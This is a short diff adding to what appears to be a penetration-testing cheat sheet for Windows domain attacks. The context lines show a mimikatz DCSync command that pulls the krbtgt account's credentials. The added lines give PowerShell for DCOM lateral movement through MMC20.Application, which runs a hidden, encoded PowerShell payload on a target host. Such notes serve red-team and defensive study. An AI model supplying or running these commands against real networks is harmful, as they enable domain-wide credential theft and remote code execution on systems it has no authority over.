@@ -261,3 +261,10 @@ mimikatz as domain admin:
 ```powershell
 lsadump::dcsync /user:corp\krbtgt
 ```
+
+DCOM:
+#dcom #
+```powershell
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$TARGET_IP"))
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JAB....","7")
+```
